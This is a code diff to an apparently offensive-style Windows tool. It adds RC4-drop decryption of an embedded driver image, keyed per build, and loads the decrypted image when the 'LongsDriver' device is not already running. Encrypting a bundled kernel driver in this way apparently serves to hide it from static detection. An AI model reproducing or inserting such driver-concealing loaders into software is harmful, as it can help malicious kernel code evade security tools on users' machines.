@@ -45,6 +45,44 @@ static HANDLE OpenDevice() {
   return CreateFileW(L"\\\\.\\LongsDriver", GENERIC_READ | GENERIC_WRITE, 0,
                      NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 }
+
+// RC4-drop decryption of the embedded image (per-build random key, see
+// embed-driver.ps1). Returns false on failure; `out` holds the plaintext.
+static bool BlobDecrypt(const std::vector<BYTE>& in, const BYTE* key,
+                        std::size_t keyLen, std::vector<BYTE>& out) {
+  if (in.empty() || key == NULL || keyLen == 0)
+    return false;
+  BYTE s[256];
+  for (int i = 0; i < 256; ++i)
+    s[i] = (BYTE)i;
+  int j = 0;
+  for (int i = 0; i < 256; ++i) {
+    j = (j + s[i] + key[i % keyLen]) & 0xFF;
+    BYTE t = s[i];
+    s[i] = s[j];
+    s[j] = t;
+  }
+  // RC4-drop: burn the first 256 keystream bytes.
+  int i = 0;
+  j = 0;
+  for (int k = 0; k < 256; ++k) {
+    i = (i + 1) & 0xFF;
+    j = (j + s[i]) & 0xFF;
+    BYTE t = s[i];
+    s[i] = s[j];
+    s[j] = t;
+  }
+  out.resize(in.size());
+  for (std::size_t n = 0; n < in.size(); ++n) {
+    i = (i + 1) & 0xFF;
+    j = (j + s[i]) & 0xFF;
+    BYTE t = s[i];
+    s[i] = s[j];
+    s[j] = t;
+    out[n] = in[n] ^ s[(s[i] + s[j]) & 0xFF];
+  }
+  return !out.empty();
+}
 #endif
 
 HANDLE OpenDriver(const std::vector<std::wstring>& args) {
@@ -67,10 +105,19 @@ HANDLE OpenDriver(const std::vector<std::wstring>& args) {
     }
   } else {
 #ifdef LONGS_DRIVER_BLOB_H
-    if (LongsDriverBlob::size > 0) {
-      raw.assign(LongsDriverBlob::blob, LongsDriverBlob::blob + LongsDriverBlob::size);
-      std::wcout << L"[+] Driver not running, loading embedded image ("
-                 << LongsDriverBlob::size << L" bytes)\n";
+    if (LongsDriverBlob::encrypted_size > 0 && LongsDriverBlob::size > 0) {
+      const std::vector<BYTE> in(
+          LongsDriverBlob::encrypted,
+          LongsDriverBlob::encrypted + LongsDriverBlob::encrypted_size);
+      if (BlobDecrypt(in, LongsDriverBlob::key,
+                      sizeof(LongsDriverBlob::key), raw) &&
+          raw.size() == LongsDriverBlob::size) {
+        std::wcout << L"[+] Driver not running, loading embedded image ("
+                   << raw.size() << L" bytes)\n";
+      } else {
+        std::cerr << "[!] Embedded image failed to decrypt\n";
+        return INVALID_HANDLE_VALUE;
+      }
     }
 #endif
     if (raw.empty()) {
